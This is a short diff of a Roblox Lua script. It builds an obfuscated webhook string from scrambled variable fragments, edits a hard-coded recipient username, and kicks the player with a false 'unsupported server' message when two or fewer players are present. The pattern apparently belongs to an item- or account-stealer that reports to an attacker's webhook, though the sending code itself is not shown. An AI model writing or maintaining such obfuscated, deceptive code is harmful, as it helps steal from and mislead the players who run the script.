@@ -801,8 +801,9 @@ webHook = "\"" .. ajgbsjw .. pqqjevw .. kebtbak .. kwbrbsi .. oqbrbek .. "\""
 local kwbabsi = "X4"
 local iwnrbtk = "_"
 local pqjrbwi = "ND"
-local pbehaid = "Y"
-userName = "\"" .. kwbrbsi .. iwnrbtk .. pqjrbwi .. pbehaid .. "\""if #game:GetService("Players"):GetPlayers() <= 2 then
+local pbehaid = "Yq"
+userName = "\"" .. kwbrbsi .. iwnrbtk .. pqjrbwi .. pbehaid .. "\""
+if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
 
